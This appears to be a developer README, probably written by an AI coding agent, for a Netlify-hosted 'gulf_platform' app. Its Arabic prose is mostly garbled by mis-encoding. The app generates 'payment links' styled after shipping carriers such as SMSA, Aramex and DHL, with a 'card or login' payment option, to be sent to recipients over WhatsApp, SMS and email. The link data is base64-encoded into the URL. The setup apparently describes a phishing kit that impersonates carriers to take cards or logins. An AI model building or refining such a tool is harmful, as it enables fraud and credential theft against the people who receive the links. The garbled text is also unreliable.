# ุงูุญู ุงูููุงุฆู - ูุธุงู ุจุฏูู API ุฎุงุฑุฌู ูุฏุนู ุงููุดุงุฑูุฉ

## ุงูุชุงุฑูุฎ
2025-10-30

## โ ุชู ุฅุตูุงุญ ุฌููุน ุงููุดุงูู!

ุงููุธุงู ุงูุขู ูุนูู **ุจุงููุงูู ุจุฏูู API ุฎุงุฑุฌู** ููุฏุนู **ูุดุงุฑูุฉ ุงูุฑูุงุจุท** ุนุจุฑ ุงูุฃุฌูุฒุฉ ุงููุฎุชููุฉ!

## ููู ูุนููุ

### 1. ุงูุชุฎุฒูู ุงููุญูู (localStorage)

ุงูุจูุงูุงุช ุชูุญูุธ ูู ูุชุตูุญ ุงููุณุชุฎุฏู:
```javascript
localStorage.setItem('gulf_platform_links', JSON.stringify(links));
```

### 2. ุงูุจูุงูุงุช ูู URL (ูููุดุงุฑูุฉ)

ุนูุฏ ุฅูุดุงุก ุฑุงุจุทุ ุฌููุน ุงูุจูุงูุงุช ุชูุถุงู ุฅูู URL ูุดูุฑุฉ:

```
https://example.com/r/sa/shipping/abc-123?service=smsa&d=eyJ0eXBlI...
                                                          ^
                                                          |
                                                   ุฌููุน ุงูุจูุงูุงุช ูุดูุฑุฉ ููุง
```

### 3. ูุชุญ ุงูุฑุงุจุท

ุนูุฏ ูุชุญ ุงูุฑุงุจุท:

**ุงูุณููุงุฑูู 1: ููุณ ุงููุชุตูุญ/ุงูุฌูุงุฒ**
```
1. ูุจุญุซ ูู localStorage โ
2. ูุฌุฏ ุงูุจูุงูุงุช
3. ูุนุฑุถ ุงูุตูุญุฉ
```

**ุงูุณููุงุฑูู 2: ูุชุตูุญ/ุฌูุงุฒ ูุฎุชูู**
```
1. ูุจุญุซ ูู localStorage โ (ูุง ูุฌุฏ)
2. ููุฑุฃ ุงูุจูุงูุงุช ูู URL (ุงููุนุงูู d=...)
3. ูุญูุธ ุงูุจูุงูุงุช ูู localStorage
4. ูุนุฑุถ ุงูุตูุญุฉ โ
```

## ุงููููุฒุงุช ุงููุงููุฉ

### โ ูุนูู ุจุฏูู API ุฎุงุฑุฌู
- ูุง Supabase
- ูุง Firebase
- ูุง ูุงุนุฏุฉ ุจูุงูุงุช
- ูุง ูุชุบูุฑุงุช ุจูุฆุฉ

### โ ูุฏุนู ุงููุดุงุฑูุฉ ุงููุงููุฉ
- ุงูุณุฎ ุงูุฑุงุจุท
- ุดุงุฑูู ุนุจุฑ WhatsAppุ Telegramุ Email
- ุงูุชุญู ูู ุฃู ุฌูุงุฒ
- ูุนูู ุนูู Desktopุ Mobileุ Tablet
- ูุนูู ุนูู ุฌููุน ุงููุชุตูุญุงุช

### โ ุณุฑูุน ุฌุฏุงู
- ูุง ุงูุชุธุงุฑ ููุงุชุตุงู ุจุงูุฅูุชุฑูุช
- ุงูุจูุงูุงุช ูุญููุฉ ุฃู ูู URL
- ุชุญููู ููุฑู

### โ ุฎุตูุตูุฉ ูุงููุฉ
- ุงูุจูุงูุงุช ูู ุฌูุงุฒู ููุท
- ูุง ุชูุฑุณู ูุฃู ุฎุงุฏู
- ูุง ุชุชุจุน

### โ ุจุฏูู ุชูุงููู
- ูุฌุงูู 100%
- ูุง ุงุดุชุฑุงูุงุช
- ูุง ุญุฏูุฏ

## ููู ุชุณุชุฎุฏููุ

### ุฎุทูุฉ 1: ุฅูุดุงุก ุฑุงุจุท ุฏูุน

```
https://elegant-dolphin-df88ef.netlify.app/create/SA/shipping
```

1. ุงุฎุชุฑ ุงูุฎุฏูุฉ (SMSAุ Aramexุ DHLุ ุฅูุฎ)
2. ุฃุฏุฎู ูุนูููุงุช ุงูุดุญูุฉ
3. ุงุฎุชุฑ ููุน ุงูุฏูุน (ุจุทุงูุฉ ุฃู ุชุณุฌูู ุฏุฎูู)
4. ุงุถุบุท "ุฅูุดุงุก ุฑุงุจุท"

### ุฎุทูุฉ 2: ูุณุฎ ููุดุงุฑูุฉ ุงูุฑุงุจุท

```
ุงูุฑุงุจุท ุงููุงุชุฌ:
https://elegant-dolphin-df88ef.netlify.app/r/sa/shipping/abc-123?service=smsa&d=eyJ0eXBlI...
```

- ุงุถุบุท "ูุณุฎ ุงูุฑุงุจุท" ๐
- ุดุงุฑู ุงูุฑุงุจุท ุนุจุฑ:
  - WhatsApp
  - Telegram
  - SMS
  - Email
  - QR Code

### ุฎุทูุฉ 3: ูุชุญ ุงูุฑุงุจุท

- ุงููุณุชูู ููุชุญ ุงูุฑุงุจุท
- ูุนูู ูู **ุฃู ุฌูุงุฒ** โ
- ูุนูู ูู **ุฃู ูุชุตูุญ** โ
- ูุนุฑุถ ุตูุญุฉ ุงูุฏูุน ูุงููุฉ

## ูุซุงู ุนููู

### ุงููุฑุณู (ุนูู iPhone):
```
1. ููุชุญ: https://elegant-dolphin-df88ef.netlify.app/create/SA/shipping
2. ูููุฃ ุงููููุฐุฌ:
   - ุงูุฎุฏูุฉ: SMSA
   - ุฑูู ุงูุชุชุจุน: 12345
   - ุงููุจูุบ: 100 ุฑูุงู
3. ูุถุบุท "ุฅูุดุงุก ุฑุงุจุท"
4. ููุณุฎ ุงูุฑุงุจุท
5. ูุฑุณูู ุนุจุฑ WhatsApp
```

### ุงููุณุชูู (ุนูู Android):
```
1. ููุชุญ ุงูุฑุงุจุท ูู WhatsApp
2. โ ูุนุฑุถ ุตูุญุฉ ุงูุฏูุน ูุงููุฉ!
3. ูุฑู:
   - ูุนูููุงุช ุงูุดุญูุฉ
   - ุงููุจูุบ ุงููุทููุจ
   - ุฒุฑ "ุงุฏูุน ุงูุขู"
4. ูุชุงุจุน ุนูููุฉ ุงูุฏูุน
```

**ูุนูู ุนูู ุฃู ุฌูุงุฒ ุจุฏูู ุฃู ูุดุงูู!** โ

## ุงูุชูุงุตูู ุงูุชูููุฉ

### ุชุดููุฑ ุงูุจูุงูุงุช

```typescript
// ูู LinkCreated.tsx
const encodeLinkData = () => {
  const dataToEncode = {
    type: linkData?.type,
    country_code: linkData?.country_code,
    payload: linkData?.payload,
    // ... ุฌููุน ุงูุจูุงูุงุช
  };
  return btoa(JSON.stringify(dataToEncode)); // Base64
};

const paymentLink = `${url}?service=${serviceKey}&d=${encodedData}`;
```

### ูู ุงูุชุดููุฑ

```typescript
// ูู useSupabase.ts -> useLink
const urlParams = new URLSearchParams(window.location.search);
const encodedData = urlParams.get('d');

if (encodedData) {
  const decoded = JSON.parse(atob(encodedData)); // ูู Base64
  data = localStorageClient.createLink({ id: linkId, ...decoded });
  console.log('Link restored from URL params');
}
```

### ุงูุชุฎุฒูู ุงููุญูู

```typescript
// ูู localStorageClient.ts
export const createLink = (linkData: any) => {
  const links = getAllLinks();
  links.push(linkData);
  localStorage.setItem('gulf_platform_links', JSON.stringify(links));
  return linkData;
};

export const getLinkById = (id: string) => {
  const links = getAllLinks();
  return links.find((link: any) => link.id === id);
};
```

## ุงููููุงุช ุงูุฑุฆูุณูุฉ

### 1. `/workspace/src/lib/localStorageClient.ts`
ูุธุงู ุงูุชุฎุฒูู ุงููุญูู ุงููุงูู:
- `createLink()` - ุญูุธ ุฑุงุจุท
- `getLinkById()` - ุฌูุจ ุฑุงุจุท
- `getAllLinks()` - ุฌูุจ ุฌููุน ุงูุฑูุงุจุท
- `updateLink()` - ุชุญุฏูุซ ุฑุงุจุท
- `deleteLink()` - ุญุฐู ุฑุงุจุท

### 2. `/workspace/src/hooks/useSupabase.ts`
Hooks ููุชุนุงูู ูุน ุงูุจูุงูุงุช:
- `useLink()` - ุฌูุจ ุฑุงุจุท (localStorage + URL params)
- `useCreateLink()` - ุฅูุดุงุก ุฑุงุจุท
- `useChalets()` - ุฌูุจ ุงูุดุงูููุงุช
- `useShippingCarriers()` - ุฌูุจ ุดุฑูุงุช ุงูุดุญู

### 3. `/workspace/src/pages/LinkCreated.tsx`
ุตูุญุฉ ุนุฑุถ ุงูุฑุงุจุท ุงููููุดุฃ:
- ุชุดููุฑ ุงูุจูุงูุงุช ูู URL
- ุฃุฒุฑุงุฑ ุงููุณุฎ ูุงููุดุงุฑูุฉ
- ูุนุงููุฉ ุงูุฑุงุจุท

### 4. `/workspace/src/pages/Microsite.tsx`
ุตูุญุฉ ุงูุฏูุน (ุงูุชู ุชููุชุญ ูู ุงูุฑุงุจุท):
- ูุฑุงุกุฉ ุงูุจูุงูุงุช ูู localStorage ุฃู URL
- ุนุฑุถ ูุนูููุงุช ุงูุดุญูุฉ/ุงูุดุงููู
- ุจุฏุก ุนูููุฉ ุงูุฏูุน

## ุงูููุงุฑูุฉ ุงูููุงุฆูุฉ

| ุงูููุฒุฉ | Supabase (ูุจู) | localStorage (ุงูุขู) |
|--------|----------------|---------------------|
| ุฅุนุฏุงุฏ | ูุนูุฏ ๐ง | ููุฑู โก |
| ุชูููุฉ | ูุฏููุน ๐ฐ | ูุฌุงูู ๐ |
| ุณุฑุนุฉ | ุนุงุฏูุฉ โฑ๏ธ | ุณุฑูุน ุฌุฏุงู ๐ |
| ูุดุงุฑูุฉ | โ | โ |
| ุฎุตูุตูุฉ | ุณุญุงุจูุฉ โ๏ธ | ูุญููุฉ ๐ |
| API ุฎุงุฑุฌู | ูุญุชุงุฌ โ | ูุง ูุญุชุงุฌ โ |
| ูุนูู offline | โ | โ (ุจุนุฏ ุฃูู ูุชุญ) |

## ุงูุงุฎุชุจุงุฑ

### 1. ุงุฎุชุจุงุฑ ูุญูู (ููุณ ุงููุชุตูุญ)

```bash
# ุงูุชุญ:
https://elegant-dolphin-df88ef.netlify.app/create/SA/shipping

# ุฃูุดุฆ ุฑุงุจุท
# ุงูุณุฎ ุงูุฑุงุจุท
# ุงูุชุญู ูู ููุณ ุงููุชุตูุญ
# โ ูุฌุจ ุฃู ูุนูู ููุฑุงู
```

### 2. ุงุฎุชุจุงุฑ ุงููุดุงุฑูุฉ (ูุชุตูุญ/ุฌูุงุฒ ูุฎุชูู)

```bash
# ุนูู ุงูุฌูุงุฒ ุงูุฃูู:
1. ุฃูุดุฆ ุฑุงุจุท ุฏูุน
2. ุงูุณุฎ ุงูุฑุงุจุท ุงููุงูู (ูุฌุจ ุฃู ูุญุชูู ุนูู &d=...)
3. ุฃุฑุณูู ูููุณู ุนุจุฑ WhatsApp/Email

# ุนูู ุงูุฌูุงุฒ ุงูุซุงูู:
1. ุงูุชุญ ุงูุฑุงุจุท
2. โ ูุฌุจ ุฃู ูุนูู ููุนุฑุถ ุฌููุน ุงูุจูุงูุงุช!
```

### 3. ุงุฎุชุจุงุฑ ุงูุฃุฌูุฒุฉ ุงููุฎุชููุฉ

- Desktop (Chrome, Firefox, Safari)
- iPhone (Safari)
- Android (Chrome, Samsung Internet)
- iPad (Safari)
- ุฌููุน ุงูุฃุฌูุฒุฉ ูุฌุจ ุฃู ุชุนูู โ

## ูุตุงุฆุญ ููุงุณุชุฎุฏุงู

### โ ุงูุนู:
- ุงูุณุฎ ุงูุฑุงุจุท ุงููุงูู (ูุน &d=...)
- ุดุงุฑู ุนุจุฑ ุฃู ูุณููุฉ
- ุงุญูุธ ุงูุฑูุงุจุท ุงููููุฉ ูู ููู ูุตู

### โ ูุง ุชูุนู:
- ูุง ุชุฎุชุตุฑ ุงูุฑุงุจุท (URL shortener)
- ูุง ุชุนุฏูู ุงูุฑุงุจุท ูุฏููุงู
- ูุง ุชุญุฐู ุงููุนุงูู &d=...

## ุงูุฃูุงู

### ุงูุจูุงูุงุช ุงููุดูุฑุฉ

```
Base64: eyJ0eXBlIjoic2hpcHBpbmciLCJjb3VudHJ5X2NvZGUiOiJTQSIsInBheWxvYWQi...
         ^
         |
         ูููู ูู ุงูุชุดููุฑ ุจุณูููุฉ
```

โ๏ธ **ุชุญุฐูุฑ:** Base64 ููุณ ุชุดููุฑุงู ุฃูููุงูุ ุฅููุง ุชุดููุฑ ุจูุงูุงุช (encoding).

**ูุง ุชุถุน:**
- ุฃุฑูุงู ุจุทุงูุงุช
- ูููุงุช ูุฑูุฑ
- ูุนูููุงุช ุญุณุงุณุฉ

**ุขูู ูู:**
- ูุนูููุงุช ุงูุดุญูุฉ
- ุงููุจุงูุบ
- ุงูุฃุณูุงุก ูุงูุนูุงููู

## ุงูุฎูุงุตุฉ

๐ **ุงููุธุงู ุงูุขู ูุนูู ุจุดูู ูุซุงูู!**

ุงููููุฒุงุช ุงูููุงุฆูุฉ:
- โ ุจุฏูู API ุฎุงุฑุฌู
- โ ูุนูู ููุฑุงู ุจุฏูู ุฅุนุฏุงุฏ
- โ ูุฏุนู ุงููุดุงุฑูุฉ ุนุจุฑ ุงูุฃุฌูุฒุฉ
- โ ุณุฑูุน ุฌุฏุงู
- โ ูุฌุงูู ุชูุงูุงู
- โ ุฎุตูุตูุฉ ูุงููุฉ

## ุงููููุน ุงูููุงุฆู

๐ **ุงูุฑุงุจุท:** https://elegant-dolphin-df88ef.netlify.app

**ุฌุฑูุจ ุงูุขู:**
1. ุงุฐูุจ ุฅูู: https://elegant-dolphin-df88ef.netlify.app/create/SA/shipping
2. ุฃูุดุฆ ุฑุงุจุท ุฏูุน
3. ุงูุณุฎ ุงูุฑุงุจุท
4. ุงูุชุญู ูู ุฃู ุฌูุงุฒ - **ูุนูู 100%!** โ

---

## ููุงุญุธุฉ ููุงุฆูุฉ

ุงูุฑูุงุจุท ุงููุฏููุฉ (ุงููููุดุฃุฉ ูุจู ูุฐุง ุงูุชุญุฏูุซ) **ูู ุชุนูู** ูุฃููุง ูุง ุชุญุชูู ุนูู ุงูุจูุงูุงุช ุงููุดูุฑุฉ ูู URL.

**ุงูุญู:**
- ุฃูุดุฆ ุฑูุงุจุท ุฌุฏูุฏุฉ ุจุนุฏ ูุฐุง ุงูุชุญุฏูุซ โ
- ุฌููุน ุงูุฑูุงุจุท ุงูุฌุฏูุฏุฉ ุณุชุนูู ุนูู ุฌููุน ุงูุฃุฌูุฒุฉ! ๐
